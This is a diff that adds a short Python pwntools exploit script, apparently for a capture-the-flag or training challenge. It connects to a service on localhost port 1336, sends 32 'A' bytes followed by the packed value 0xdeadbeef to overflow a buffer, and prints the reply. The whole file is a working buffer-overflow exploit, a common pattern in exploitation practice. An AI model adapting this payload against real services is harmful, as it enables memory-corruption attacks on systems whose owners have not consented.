@@ -1,0 +1,15 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+connect = remote('127.0.0.1', 1336)
+
+print(connect.recvn(18))
+
+payload = "\x41"*32
+
+payload += p32(0xdeadbeef)
+
+connect.send(payload)
+
+print(connect.recvn(34))
